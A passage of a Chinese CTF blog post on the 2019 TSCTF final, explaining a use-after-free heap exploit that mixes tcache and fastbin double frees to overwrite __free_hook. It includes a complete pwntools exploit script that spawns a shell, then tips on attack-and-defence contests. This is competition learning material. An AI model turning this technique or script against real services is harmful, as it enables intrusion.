<h2 id="程序分析和漏洞挖掘：-2"><a href="#程序分析和漏洞挖掘：-2" class="headerlink" title="程序分析和漏洞挖掘："></a>程序分析和漏洞挖掘：</h2><p>程序没啥好分析的，就一个<code>UAF</code>的洞，是人都可以看出来，我就不贴出来了。主要分析一下利用的技巧。个人觉得这道题技巧性还是蛮高的。</p>
<p>看一下保护全开，心里有数了13数：肯定要改<code>hook</code>。</p>
<p>说实话，这道题开始我感觉还蛮简单的，一顿套路操作猛如虎。。。到最后发现，想用<code>double free</code>往<code>malloc_hook</code>上分<code>chunk</code>，<code>new</code>的次数超了，他限制的是20次，正常情况下要21次才能成功。</p>
<p>这时侯，开始想到这题肯定不是套路，还是有新东西的。以下为当时想到的逐渐接近正解的三个阶段：</p>
<ol>
<li>申请7个chunk：从chunk1到chunk7，然后全部<code>free</code>，这时候再<code>free</code>一次chunk7，想实现chunk7又在<code>tcache</code>里，又在<code>fastbin</code>里，结果调试发现失败，<code>tcache</code>的检测机制还是会检测到<code>double free</code>。</li>
<li>逆向思维：我们的目标是想让一个chunk又在<code>tcache</code>中，又在<code>fastbin</code>中。既然让这个chunk先在<code>tcache</code>，后在<code>fastbin</code>中行不通的话，那我们就让他先在<code>fastbin</code>中，后在<code>tcache</code>中：申请8个chunk：从chunk1到chunk7，然后全部<code>free</code>，这时候再<code>free</code>chunk8，再new一个，再次<code>free</code>chunk8，这时，chunk8实现了我们的目标。</li>
<li>本以为可以之后就可以直接分到<code>main_arena-0x33</code>上去然后直接拿<code>shell</code>，结果后来调试发现当把<code>fastbin</code>里剩余的chunk链放入<code>tcache</code>里时，因为过不了<code>__int_malloc</code>里的某个检测（貌似是因为伪造的chunk的fd指针是个非法数据，因为太菜没看这部分源码。。。有大佬知道请评论一下orz），而失败。。。思路陷入死胡同。。。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#----------------第一种--------------------------</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	new(<span class="number">0x60</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	delete(i+<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">7</span>)                 </span><br><span class="line"><span class="comment">#----------------失败----------------------------</span></span><br><span class="line"><span class="comment">#----------------第二种--------------------------</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">	new(<span class="number">0x60</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i+<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">new(<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#----------------成功---------------------------</span></span><br></pre></td></tr></table></figure>
<p>最后学长想到了另外一个点：<code>tcache</code>里分配chunk和<code>fastbin</code>不同，其不检查<code>size</code>，<code>fastbin</code>因为要检查<code>size</code>所以必须分到<code>main_arena-0x33</code>，但是<code>tcache</code>就可以直接分到<code>__free_hook-0x10</code>，然后就顺利<code>getshell</code>！！！   </p>
<h2 id="exp如下：-2"><a href="#exp如下：-2" class="headerlink" title="exp如下："></a>exp如下：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = <span class="string">'./easyheap'</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">attach = <span class="number">0</span></span><br><span class="line"><span class="comment">#P = ELF(path)</span></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">	p = process(path)</span><br><span class="line">	<span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'size:'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'idx:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'idx:'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x500</span>,<span class="string">'\x00'</span>) <span class="comment">#0</span></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'\x11'</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">view(<span class="number">0</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - (<span class="number">0x7fe5df606ca0</span><span class="number">-0x7fe5df422000</span>)</span><br><span class="line">log.success(<span class="string">'libcbase = '</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'\x22'</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'\x33'</span>) <span class="comment">#3</span></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'\x44'</span>) <span class="comment">#4</span></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'\x55'</span>) <span class="comment">#5</span></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'\x66'</span>) <span class="comment">#6</span></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'\x77'</span>) <span class="comment">#7</span></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'\x88'</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">	delete(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'\x10'</span>) <span class="comment">#9</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">target = libcbase + libc.sym[<span class="string">'__free_hook'</span>] - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x60</span>,p64(target)) <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'a'</span>) <span class="comment">#11</span></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'b'</span>) <span class="comment">#12</span></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'c'</span>)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'d'</span>)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'e'</span>)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'/bin/sh\x00'</span>) <span class="comment">#16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> attach == <span class="number">1</span>:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>) <span class="comment">#17</span></span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0xe237f</span>,<span class="number">0xe2383</span>,<span class="number">0xe2386</span>,<span class="number">0x106ef8</span>]</span><br><span class="line">new(<span class="number">0x60</span>,p64(libcbase+libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="awd的一点点心得经验（pwn方面）："><a href="#awd的一点点心得经验（pwn方面）：" class="headerlink" title="awd的一点点心得经验（pwn方面）："></a>awd的一点点心得经验（pwn方面）：</h1><h2 id="个人心得："><a href="#个人心得：" class="headerlink" title="个人心得："></a>个人心得：</h2><p>首先我jio得攻要比守重要的多，为什么这么说呢，有两个原因：</p>
<ol>
<li>大家可以算一下，假设全场有20支队伍，你pwn了一题，就可以打全场，假设拿了flag得10分，就等于每五分钟就可以得190分，即使有的队伍打<code>patch</code>成功了，或者总分是和不变机制，那一轮也至少能拿100+的分数，再想想我们如果去打<code>patch</code>，假设我们幸运的成功了，那这一题对我们的意义也就仅仅在于每一轮会少个十分二十分，但并不会妨碍做出来这题的队伍每轮得到100+的分数（除非这道题全场都做出来了。。。。），我们出一道题所得的分要比打<code>patch</code>少扣的分要多得多，就相当于你做出一题，而你其他所有题都在被别人打，你的分数也可以维持不降。</li>
<li>pwn的打<code>patch</code>程序极其复杂，而且不同的比赛他的<code>check</code>严密程度和个性化要求都不一样（我感觉碰到<code>check</code>难一点的<code>patch</code>不比写<code>exp</code>简单。。。），我打<code>TSCTF</code>时，打了三个<code>patch</code>，一个<code>off-one-null</code>，两个<code>uaf</code>，最后两个没防住，一个没过<code>check</code>（<code>filesystem</code>我当时打了<code>uaf</code>，但是他有要求说<code>patch</code>只能打在<code>eh_frame</code>段，其他任何段都不能动一个字节，后来问了ym学长他说常规打法虽然是打在<code>eh_frame</code>段，但实际上其他段的某些部位的字节会变。。这个还有待研究。。），但时间已经没有多少了，根本不够再去写<code>exp</code>，最后就是眼睁睁地看着自己一直被打而无可奈何。。。</li>
</ol>
<p>感觉<code>awd</code>中<code>pwn</code>如果只有一个人负责真的太累了，一个人的话只能负责到一个面，又攻又守的感觉难度太大，除非是老赛棍orz，如果真的一个人去打的时候，最好目标明确果断一点，不要看了一会题，写了一会<code>exp</code>，又去<code>patch</code>一会。。。</p>
<p>至于怎么打patch的话，ym学长和panda学长的博客写的很清晰明了：<a href="https://e3pem.github.io/2019/07/08/patch/patch%E5%AE%9E%E6%88%98/#more" target="_blank" rel="noopener">传送门1号</a>，<a href="http://p4nda.top/2018/07/02/patch-in-pwn/" target="_blank" rel="noopener">传送门2号</a></p>
<p>还有就是线下赛的特点一般是题目代码量极大，会在寻找漏洞点和逆向上出为难大家的点，所以千万不能急，要沉下心慢慢找洞，不要老是看得分榜，专注一点。</p>
<h2 id="比赛时需要注意的细节："><a href="#比赛时需要注意的细节：" class="headerlink" title="比赛时需要注意的细节："></a>比赛时需要注意的细节：</h2><ol>
<li>改服务器密码</li>
<li>打好<code>patch</code>别忘给权限</li>
<li>要留意有没有后门，因为pwn和web不一样，写<code>exp</code>是一个阶段性的工作，所以pwn很难开局就打起来，一般是过了一两个小时才有队伍陆陆续续写出<code>exp</code>然后开始打，所以主办方有可能为了防止pwn选手开局就陷入沉闷的写<code>exp</code>环节，有可能会在代码量极大的题中留有后门(例如cxk)。</li>
</ol>
<h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><ol>
<li>winscp/ftp</li>
<li>xshell</li>
<li>自动化交flag的脚本</li>
<li>pwn题环境和patch工具</li>
<li>u盘？（合作时传文件比较快？）</li>
</ol>

      
    </div>
    
    
    

    

    
      <div>
        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
  <div>打赏还是打残，这是个问题</div>
  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
    <span>打赏</span>
  </button>
  <div id="QR" style="display: none;">

    
      <div id="wechat" style="display: inline-block">
        <img id="wechat_qr" src="/images/weichat.png" alt="xiaoxiaorenwu's blog 微信支付">
        <p>微信支付</p>
      </div>
    

    
      <div id="alipay" style="display: inline-block">
        <img id="alipay_qr" src="/images/alipay.jpg" alt="xiaoxiaorenwu's blog 支付宝">
        <p>支付宝</p>
      </div>
    

    

  </div>
</div>

      </div>
    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    xiaoxiaorenwu's blog
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="https://xiaoxiaorenwu.top/2019/08/01/2019-TSCTF-FINAL(填坑)/" title="2019_TSCTF_FINAL(填坑)">https://xiaoxiaorenwu.top/2019/08/01/2019-TSCTF-FINAL(填坑)/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/07/05/5种方法解heap_master/" rel="next" title="5种方法解2019_*ctf_heap_master来加深对深层次堆利用手段的理解">
                <i class="fa fa-chevron-left"></i> 5种方法解2019_*ctf_heap_master来加深对深层次堆利用手段的理解
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
    </div>
  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="https://i.loli.net/2019/01/29/5c5007a7f263b.jpg" alt="xiaoxiaorenwu's blog">
            
              <p class="site-author-name" itemprop="name">xiaoxiaorenwu's blog</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">22</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">11</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/xiaoxiaorenwu" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:renwuxiaoxiao@126.com" target="_blank" title="E-mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                大佬们的blog~~
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="http://p4nda.top" title="p4nda" target="_blank">p4nda</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://sunichi.github.io/" title="sunichi" target="_blank">sunichi</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://e3pem.github.io/" title="e3pem" target="_blank">e3pem</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://p1umer.github.io/" title="P1umer" target="_blank">P1umer</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://hpasserby.me/" title="hpasserby" target="_blank">hpasserby</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#cxk"><span class="nav-number">1.</span> <span class="nav-text">cxk:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析和漏洞挖掘："><span class="nav-number">1.1.</span> <span class="nav-text">程序分析和漏洞挖掘：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp如下："><span class="nav-number">1.2.</span> <span class="nav-text">exp如下：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#filesystem"><span class="nav-number">2.</span> <span class="nav-text">filesystem:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析和漏洞挖掘：-1"><span class="nav-number">2.1.</span> <span class="nav-text">程序分析和漏洞挖掘：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞点有两个："><span class="nav-number">2.1.1.</span> <span class="nav-text">漏洞点有两个：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#遇到的困难和需要思考的地方："><span class="nav-number">2.1.2.</span> <span class="nav-text">遇到的困难和需要思考的地方：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp如下：-1"><span class="nav-number">2.2.</span> <span class="nav-text">exp如下：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn1"><span class="nav-number">3.</span> <span class="nav-text">pwn1:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析和漏洞挖掘：-2"><span class="nav-number">3.1.</span> <span class="nav-text">程序分析和漏洞挖掘：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp如下：-2"><span class="nav-number">3.2.</span> <span class="nav-text">exp如下：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#awd的一点点心得经验（pwn方面）："><span class="nav-number">4.</span> <span class="nav-text">awd的一点点心得经验（pwn方面）：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#个人心得："><span class="nav-number">4.1.</span> <span class="nav-text">个人心得：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#比赛时需要注意的细节："><span class="nav-number">4.2.</span> <span class="nav-text">比赛时需要注意的细节：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#工具："><span class="nav-number">4.3.</span> <span class="nav-text">工具：</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">xiaoxiaorenwu's blog</span>

  
</div>









        
<div class="busuanzi-count">
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
  </script>
  
    <span class="site-uv">
      访客数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      人
    </span>
  

  
    <span class="site-pv">
      总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  










  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
  
  <script type="text/javascript">
    var GUEST = ['nick','mail','link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item=>{
      return GUEST.indexOf(item)>-1;
    });
    new Valine({
        el: '#comments' ,
        verify: false,
        notify: false,
        appId: 'wQR3fxNYiFB3Sh2MdPvjK8ez-gzGzoHsz',
        appKey: 'M81KRpr3NUHCSrwBJ9TY73HF',
        placeholder: '欢乐时光就要开始了',
        avatar:'mm',
        guest_info:guest,
        pageSize:'10' || 10,
    });
  </script>



  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

